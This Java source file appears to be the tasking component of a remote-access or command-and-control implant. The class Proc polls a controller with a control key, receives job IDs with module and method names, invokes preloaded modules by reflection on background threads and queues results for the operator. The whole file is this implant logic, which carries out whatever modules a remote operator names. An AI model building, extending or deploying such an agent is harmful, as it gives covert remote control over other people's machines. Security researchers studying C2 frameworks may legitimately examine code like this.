package agent;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.security.NoSuchAlgorithmException;
import java.util.Hashtable;

public class Proc {
	public static void taskify(String taskID) {
		Hashtable schtask = new Hashtable();
		schtask.put("status","wait");
		Main.schtasks.put(taskID,schtask);
	}
	
	public static Hashtable retrieve(String pkgName,String method) throws NoSuchMethodException, SecurityException {
		
		Class packageObj = (Class) Main.dist.get(pkgName);
		Method packageEntry = packageObj.getMethod(method,Hashtable.class);
		Hashtable dirDescriptor = new Hashtable();
		dirDescriptor.put("class",packageObj);
		dirDescriptor.put("method",packageEntry);
		return dirDescriptor;
	}

	
	//public static void thread(Hashtable directiveCall, Hashtable dirArgs, String taskID) {
	public static void needle(Runnable methodRuntime) {
		Thread invocation = new Thread(methodRuntime);
		invocation.start();
	}
	
	public static void ingest() throws ClassNotFoundException, NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, NoSuchAlgorithmException {
		Hashtable agentDirective = Netw.send("Ctrl", null, Main.config.get("ctrlKey").toString(), Crypt.bake());
		String taskID = agentDirective.get("jobID").toString();
		if (!Main.taskManifest.contains(taskID)) {
			Main.taskManifest.add(taskID);
			String pkgName = agentDirective.get("pkgName").toString();
			String pkgMeth = agentDirective.get("pkgMeth").toString();
			
			if (Util.distant(pkgName) == 0) {
				Hashtable errorTable = new Hashtable();
				errorTable.put("status","complete");
				errorTable.put("class",pkgName);
				errorTable.put("module",pkgMeth);
				errorTable.put("jobID",taskID);
				errorTable.put("output","error : the class you specified has not been loaded on the agent");
				Main.schtasks.put(taskID, errorTable);
			} else {
				Hashtable dirDescriptor = retrieve(pkgName,pkgMeth);
				Runnable methodRuntime = new Runnable() {
					public void run() {
						try {
							//Hashtable dirResult = (Hashtable) ((Method) directiveCall.get("method")).invoke((Class) directiveCall.get("class"),dirArgs);
							Hashtable dirResult = (Hashtable) ((Method) dirDescriptor.get("method")).invoke(Hashtable.class,agentDirective);
							dirResult.put("status","complete");
							dirResult.put("class", agentDirective.get("pkgName"));
							dirResult.put("module",agentDirective.get("pkgMeth"));
							dirResult.put("jobID",taskID);
							Main.schtasks.put(taskID,dirResult);
						} catch (IllegalAccessException | IllegalArgumentException | InvocationTargetException e) {
							e.printStackTrace();
						}
						
					}
				};
				needle(methodRuntime);
			}			
		}

	}
}
